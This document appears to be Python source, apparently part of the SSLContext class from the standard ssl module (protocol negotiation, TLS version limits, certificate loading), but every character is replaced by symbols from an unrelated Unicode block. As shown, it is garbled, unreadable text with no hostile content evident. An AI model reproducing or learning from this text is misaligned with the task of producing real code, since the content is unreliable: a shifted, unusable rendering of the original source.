꛾ꚳ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚷꚫꚲꛬ꛾ꛮ꛴꛴ꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛷꛰꛹ꚳꛭꚴꚫꛈꛈꚫꚻꚫ꛺꛽ꚫ꛷꛰꛹ꚳꛭꚴꚫꛉꚫꚽꛀꛀꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛞꛞꛗꛐ꛽꛽꛺꛽ꚳꚲꛙꛛꛙꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫꚼꚫ꛿꛺ꚫꚽꛀꛀꚫ꛴꛹ꚫ꛷꛰꛹꛲꛿꛳ꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺꛾ꚹꛬ꛻꛻꛰꛹ꛯꚳ꛷꛰꛹ꚳꛭꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺꛾ꚹ꛰꜃꛿꛰꛹ꛯꚳꛭꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛰꛿ꛪ꛹꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚳ꛻꛽꛺꛿꛺꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛿ꛪ꛾꛰꛽꜁꛰꛽꛹ꛬ꛸꛰ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚳ꛾꛰꛷꛱ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛹ꛬ꛸꛰ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛹ꛬ꛸꛰ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫ꛴꛾ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛹꛴ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫꛈꚫꛙ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫꛮꛬ꛷꛷ꛬꛭ꛷꛰ꚳ꛾꛰꛽꜁꛰꛽ꛪ꛹ꛬ꛸꛰ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛹꛺꛿ꚫꛬꚫꛮꛬ꛷꛷ꛬꛭ꛷꛰ꚫ꛺ꛭ꛵꛰ꛮ꛿ꚭꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛳꛴꛸ꛪꛮꛭꚳ꛾꛾꛷꛺ꛭ꛵ꚷꚫ꛾꛰꛽꜁꛰꛽꛹ꛬ꛸꛰ꚷꚫ꛾꛾꛷ꛮ꛿꜃ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛽꜁꛰꛽꛹ꛬ꛸꛰ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪ꛰꛹ꛮ꛺ꛯ꛰ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚳ꛾꛰꛽꜁꛰꛽꛹ꛬ꛸꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛹ꛬ꛸꛰ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚳ꛾꛾꛷꛺ꛭ꛵ꚷꚫ꛾꛰꛽꜁꛰꛽꛹ꛬ꛸꛰ꚷꚫ꛾꛾꛷ꛮ꛿꜃ꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛹꛴ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫꛈꚫ꛾꛳꛴꛸ꛪꛮꛭꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛿ꛪꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚳ꛾꛰꛷꛱ꚷꚫꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺꛾ꚫꛈꚫꛭ꜄꛿꛰ꛬ꛽꛽ꛬ꜄ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛴꛹ꚫꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛭꚫꛈꚫꛭ꜄꛿꛰꛾ꚳ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚷꚫꚲꛬ꛾ꛮ꛴꛴ꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛷꛰꛹ꚳꛭꚴꚫꛈꛈꚫꚻꚫ꛺꛽ꚫ꛷꛰꛹ꚳꛭꚴꚫꛉꚫꚽꛀꛀꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛞꛞꛗꛐ꛽꛽꛺꛽ꚳꚲꛌꛗꛛꛙꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚫ꛸꜀꛾꛿ꚫꛭ꛰ꚫꚼꚫ꛿꛺ꚫꚽꛀꛀꚫ꛴꛹ꚫ꛷꛰꛹꛲꛿꛳ꚲꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺꛾ꚹꛬ꛻꛻꛰꛹ꛯꚳ꛷꛰꛹ꚳꛭꚴꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꛿꛺꛾ꚹ꛰꜃꛿꛰꛹ꛯꚳꛭꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛰꛿ꛪꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷꛾ꚳ꛻꛽꛺꛿꛺꛾ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛷꛺ꛬꛯꛪ꜂꛴꛹ꛯ꛺꜂꛾ꛪ꛾꛿꛺꛽꛰ꛪꛮ꛰꛽꛿꛾ꚳ꛾꛰꛷꛱ꚷꚫ꛾꛿꛺꛽꛰꛹ꛬ꛸꛰ꚷꚫ꛻꜀꛽꛻꛺꛾꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛰꛽꛿꛾ꚫꛈꚫꛭ꜄꛿꛰ꛬ꛽꛽ꛬ꜄ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽꜄ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫꛮ꛰꛽꛿ꚷꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꚷꚫ꛿꛽꜀꛾꛿ꚫ꛴꛹ꚫ꛰꛹꜀꛸ꛪꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰꛾ꚳ꛾꛿꛺꛽꛰꛹ꛬ꛸꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚮꚫꛎꛌꚫꛮ꛰꛽꛿꛾ꚫꛬ꛽꛰ꚫ꛹꛰꜁꛰꛽ꚫꛛꛖꛎꛞꚮꛂꚫ꛰꛹ꛮ꛺ꛯ꛰ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛰꛹ꛮ꛺ꛯ꛴꛹꛲ꚫꛈꛈꚫꚭ꜃ꛀꚻꛄꛪꛬ꛾꛹ꚭꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛽꜀꛾꛿ꚫ꛴꛾ꚫꛟ꛽꜀꛰ꚫ꛺꛽ꚫ꛻꜀꛽꛻꛺꛾꛰ꚹ꛺꛴ꛯꚫ꛴꛹ꚫ꛿꛽꜀꛾꛿ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛰꛽꛿꛾ꚹ꛰꜃꛿꛰꛹ꛯꚳꛮ꛰꛽꛿ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛰꜃ꛮ꛰꛻꛿ꚫꛛ꛰꛽꛸꛴꛾꛾꛴꛺꛹ꛐ꛽꛽꛺꛽ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚹ꜂ꛬ꛽꛹ꚳꚭ꜀꛹ꛬꛭ꛷꛰ꚫ꛿꛺ꚫ꛰꛹꜀꛸꛰꛽ꛬ꛿꛰ꚫꛢ꛴꛹ꛯ꛺꜂꛾ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꛾꛿꛺꛽꛰ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛰꛽꛿꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛷꛺ꛬꛯꛪ꜁꛰꛽꛴꛱꜄ꛪ꛷꛺ꛮꛬ꛿꛴꛺꛹꛾ꚳꛮꛬꛯꛬ꛿ꛬꛈꛮ꛰꛽꛿꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛮ꛰꛽꛿꛾ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛷꛺ꛬꛯꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪꛮ꛰꛽꛿꛾ꚳ꛾꛰꛷꛱ꚷꚫ꛻꜀꛽꛻꛺꛾꛰ꛈꛛ꜀꛽꛻꛺꛾꛰ꚹꛞꛐꛝꛡꛐꛝꛪꛌꛠꛟꛓꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛹꛺꛿ꚫ꛴꛾꛴꛹꛾꛿ꛬ꛹ꛮ꛰ꚳ꛻꜀꛽꛻꛺꛾꛰ꚷꚫꛪꛌꛞꛙꚼꛚꛭ꛵꛰ꛮ꛿ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꜄꛾ꚹ꛻꛷ꛬ꛿꛱꛺꛽꛸ꚫꛈꛈꚫꚭ꜂꛴꛹ꚾꚽꚭꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛺꛽ꚫ꛾꛿꛺꛽꛰꛹ꛬ꛸꛰ꚫ꛴꛹ꚫ꛾꛰꛷꛱ꚹꛪ꜂꛴꛹ꛯ꛺꜂꛾ꛪꛮ꛰꛽꛿ꛪ꛾꛿꛺꛽꛰꛾ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛷꛺ꛬꛯꛪ꜂꛴꛹ꛯ꛺꜂꛾ꛪ꛾꛿꛺꛽꛰ꛪꛮ꛰꛽꛿꛾ꚳ꛾꛿꛺꛽꛰꛹ꛬ꛸꛰ꚷꚫ꛻꜀꛽꛻꛺꛾꛰ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛾꛰꛿ꛪꛯ꛰꛱ꛬ꜀꛷꛿ꛪ꜁꛰꛽꛴꛱꜄ꛪ꛻ꛬ꛿꛳꛾ꚳꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꚲ꛸꛴꛹꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛸꛴꛹꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛟꛗꛞꛡ꛰꛽꛾꛴꛺꛹ꚳ꛾꜀꛻꛰꛽ꚳꚴꚹ꛸꛴꛹꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛋ꛸꛴꛹꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛸꛴꛹꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꜁ꛬ꛷꜀꛰ꚫꛈꛈꚫꛟꛗꛞꛡ꛰꛽꛾꛴꛺꛹ꚹꛞꛞꛗ꜁ꚾꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹ꛺꛻꛿꛴꛺꛹꛾ꚫꚱꛈꚫ꜉ꛚ꛻꛿꛴꛺꛹꛾ꚹꛚꛛꛪꛙꛚꛪꛞꛞꛗ꜁ꚾꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꚹ꛸꛴꛹꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚹꛪꛪ꛾꛰꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛸ꛬ꜃꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛟꛗꛞꛡ꛰꛽꛾꛴꛺꛹ꚳ꛾꜀꛻꛰꛽ꚳꚴꚹ꛸ꛬ꜃꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛋ꛸ꛬ꜃꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛸ꛬ꜃꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꚹ꛸ꛬ꜃꛴꛸꜀꛸ꛪ꜁꛰꛽꛾꛴꛺꛹ꚹꛪꛪ꛾꛰꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛺꛻꛿꛴꛺꛹꛾ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛚ꛻꛿꛴꛺꛹꛾ꚳ꛾꜀꛻꛰꛽ꚳꚴꚹ꛺꛻꛿꛴꛺꛹꛾ꚴꚕꚕꚫꚫꚫꚫꛋ꛺꛻꛿꛴꛺꛹꛾ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛺꛻꛿꛴꛺꛹꛾ꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚷꚫꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚴꚹ꛺꛻꛿꛴꛺꛹꛾ꚹꛪꛪ꛾꛰꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꚕꚕꚫꚫꚫꚫ꛴꛱ꚫ꛳ꛬ꛾ꛬ꛿꛿꛽ꚳꛪ꛾꛾꛷ꚷꚫꚲꛓꛚꛞꛟꛑꛗꛌꛒꛪꛙꛐꛡꛐꛝꛪꛎꛓꛐꛎꛖꛪꛞꛠꛍꛕꛐꛎꛟꚲꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪꛮ꛳꛰ꛮ꛶꛾ꛪꛮ꛺꛸꛸꛺꛹ꛪ꛹ꛬ꛸꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛹ꛮ꛾ꚫꛈꚫ꛾꛰꛷꛱ꚹꛪ꛳꛺꛾꛿ꛪ꛱꛷ꛬ꛲꛾ꚫꚱꚫꛪ꛾꛾꛷ꚹꛓꛚꛞꛟꛑꛗꛌꛒꛪꛙꛐꛡꛐꛝꛪꛎꛓꛐꛎꛖꛪꛞꛠꛍꛕꛐꛎꛟꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛹ꛮ꛾ꚫꚬꛈꚫꛪ꛾꛾꛷ꚹꛓꛚꛞꛟꛑꛗꛌꛒꛪꛙꛐꛡꛐꛝꛪꛎꛓꛐꛎꛖꛪꛞꛠꛍꛕꛐꛎꛟꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛋ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪꛮ꛳꛰ꛮ꛶꛾ꛪꛮ꛺꛸꛸꛺꛹ꛪ꛹ꛬ꛸꛰ꚹ꛾꛰꛿꛿꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪꛮ꛳꛰ꛮ꛶꛾ꛪꛮ꛺꛸꛸꛺꛹ꛪ꛹ꛬ꛸꛰ꚳ꛾꛰꛷꛱ꚷꚫ꜁ꛬ꛷꜀꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꜁ꛬ꛷꜀꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛳꛺꛾꛿ꛪ꛱꛷ꛬ꛲꛾ꚫꚱꛈꚫ꜉ꛪ꛾꛾꛷ꚹꛓꛚꛞꛟꛑꛗꛌꛒꛪꛙꛐꛡꛐꛝꛪꛎꛓꛐꛎꛖꛪꛞꛠꛍꛕꛐꛎꛟꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛳꛺꛾꛿ꛪ꛱꛷ꛬ꛲꛾ꚫ꜇ꛈꚫꛪ꛾꛾꛷ꚹꛓꛚꛞꛟꛑꛗꛌꛒꛪꛙꛐꛡꛐꛝꛪꛎꛓꛐꛎꛖꛪꛞꛠꛍꛕꛐꛎꛟꚕꚫꚫꚫꚫ꛰꛷꛾꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛪꛮ꛳꛰ꛮ꛶꛾ꛪꛮ꛺꛸꛸꛺꛹ꛪ꛹ꛬ꛸꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫꛟ꛽꜀꛰ꚕꚕꚫꚫꚫꚫꛋ꛻꛽꛺꛻꛰꛽꛿꜄ꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪ꛸꛾꛲ꛪꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛟꛗꛞꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛟ꛳꛰ꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫ꛻꛽꛺꜁꛴ꛯ꛰꛾ꚫꛬꚫꛯ꛰ꛭ꜀꛲꛲꛴꛹꛲ꚫ꛳꛺꛺꛶ꚫ꛿꛺ꚫꛬ꛹ꛬ꛷꜄꜅꛰ꚫꛟꛗꛞꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹꛾ꚹꚫꛟ꛳꛰ꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫ꛴꛾ꚫꛮꛬ꛷꛷꛰ꛯꚫ꛱꛺꛽ꚫꛬ꛹꜄ꚫꛟꛗꛞꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꛸꛰꛾꛾ꛬ꛲꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚳ꛳꛰ꛬꛯ꛰꛽ꚷꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚷꚫꛬ꛷꛰꛽꛿ꚷꚫꛬ꛹ꛯꚫ꛸꛺꛽꛰ꚴꚷꚫꛭ꜀꛿ꚫ꛹꛺꛿ꚫ꛱꛺꛽ꚫꛬ꛻꛻꛷꛴ꛮꛬ꛿꛴꛺꛹ꚫꛯꛬ꛿ꛬꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛏ꜀꛰ꚫ꛿꛺ꚫ꛿꛰ꛮ꛳꛹꛴ꛮꛬ꛷ꚫꚫ꛷꛴꛸꛴꛿ꛬ꛿꛴꛺꛹꛾ꚷꚫ꛿꛳꛰ꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫꛮꛬ꛹ꚲ꛿ꚫꛭ꛰ꚫ꜀꛾꛰ꛯꚫ꛿꛺ꚫ꛱꛴꛷꛿꛰꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛿꛽ꛬ꛱꛱꛴ꛮꚫ꛺꛽ꚫ꛿꛺ꚫꛬꛭ꛺꛽꛿ꚫꛬꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚹꚫꛌ꛹꜄ꚫ꛰꜃ꛮ꛰꛻꛿꛴꛺꛹ꚫ꛽ꛬ꛴꛾꛰ꛯꚫ꛴꛹ꚫ꛿꛳꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮꛬ꛷꛷ꛭꛬꛮ꛶ꚫ꛴꛾ꚫꛯ꛰꛷ꛬ꜄꛰ꛯꚫ꜀꛹꛿꛴꛷ꚫ꛿꛳꛰ꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚷꚫ꛽꛰ꛬꛯꚷꚫ꛺꛽ꚫ꜂꛽꛴꛿꛰ꚫ꛺꛻꛰꛽ꛬ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛳ꛬ꛾ꚫꛭ꛰꛰꛹ꚫ꛻꛰꛽꛱꛺꛽꛸꛰ꛯꚹꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛰꛱ꚫ꛸꛾꛲ꛪꛮꛭꚳꛮ꛺꛹꛹ꚷꚫꛯ꛴꛽꛰ꛮ꛿꛴꛺꛹ꚷꚫ꜁꛰꛽꛾꛴꛺꛹ꚷꚫꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚷꚫ꛸꛾꛲ꛪ꛿꜄꛻꛰ꚷꚫꛯꛬ꛿ꛬꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛻ꛬ꛾꛾ꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛅꛮ꛷ꛬ꛾꛾ꛅꛫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꛫꚫ꛺꛽ꚫꛅꛮ꛷ꛬ꛾꛾ꛅꛫꛞꛞꛗꛚꛭ꛵꛰ꛮ꛿ꛫꚫ꛴꛹꛾꛿ꛬ꛹ꛮ꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛯ꛴꛽꛰ꛮ꛿꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛫꛫ꛽꛰ꛬꛯꛫꛫꚫ꛺꛽ꚫꛫꛫ꜂꛽꛴꛿꛰ꛫꛫꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜁꛰꛽꛾꛴꛺꛹ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛅꛮ꛷ꛬ꛾꛾ꛅꛫꛟꛗꛞꛡ꛰꛽꛾꛴꛺꛹ꛫꚫ꛰꛹꜀꛸ꚫ꛸꛰꛸ꛭ꛰꛽ꚫ꛺꛽ꚫ꛴꛹꛿ꚫ꛱꛺꛽ꚫ꜀꛹꛶꛹꛺꜂꛹ꚫ꜁꛰꛽꛾꛴꛺꛹ꚹꚫꛑ꛺꛽ꚫꛬꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛽ꛬ꛸꛰ꚫ꛳꛰ꛬꛯ꛰꛽ꚷꚫ꛴꛿ꚲ꛾ꚫ꛿꛳꛰ꚫ꛳꛰ꛬꛯ꛰꛽ꚫ꜁꛰꛽꛾꛴꛺꛹ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꛹꛿ꛪ꛿꜄꛻꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛅꛮ꛷ꛬ꛾꛾ꛅꛫꛪꛟꛗꛞꛎ꛺꛹꛿꛰꛹꛿ꛟ꜄꛻꛰ꛫꚫ꛰꛹꜀꛸ꚫ꛸꛰꛸ꛭ꛰꛽ꚫ꛺꛽ꚫ꛴꛹꛿ꚫ꛱꛺꛽ꚫ꜀꛹꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꛹꛿ꚫ꛿꜄꛻꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫ